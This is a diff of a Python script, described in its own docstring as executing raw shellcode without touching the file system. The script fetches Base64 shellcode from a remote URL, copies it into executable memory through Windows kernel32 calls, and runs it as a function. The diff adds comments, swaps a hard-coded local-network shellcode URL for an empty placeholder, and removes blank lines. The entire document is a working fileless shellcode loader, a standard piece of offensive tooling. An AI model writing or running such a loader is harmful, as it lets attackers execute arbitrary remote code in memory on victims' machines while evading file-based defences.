@@ -1,18 +1,21 @@
-from urllib import request
+'''
+This script is capable of executing raw shell code without touching the file system.
+'''
+# Import needed packages
+from urllib import request  # Use urllib for grabbing remote shellcode in Base64 format
 
-import base64
+import base64  # Used for decoding the shellcode
 import ctypes
-
 
 kernel32 = ctypes.windll.kernel32
 
-
 def get_code(url):
+    '''
+    Get and return the remote shellcode.
+    '''
     with request.urlopen(url) as response:
         shellcode = base64.decodebytes(response.read())
-
     return shellcode
-
 
 def write_memory(buf):
     length = len(buf)
@@ -27,15 +30,16 @@ def write_memory(buf):
     kernel32.RtlMoveMemory(ptr, buf, length)
     return ptr
 
-
 def run(shellcode):
+    '''
+    Run the shellcode we got.
+    '''
     buf = ctypes.create_string_buffer(shellcode)
     ptr = write_memory(buf)
     shell_func = ctypes.cast(ptr, ctypes.CFUNCTYPE(None))
     shell_func()
 
-
 if __name__ == '__main__':
-    url = "http://192.168.1.203:8000/my32shellcode.bin"
+    url = ""  # The URL of your shellcode
     shellcode = get_code(url)
     run(shellcode)
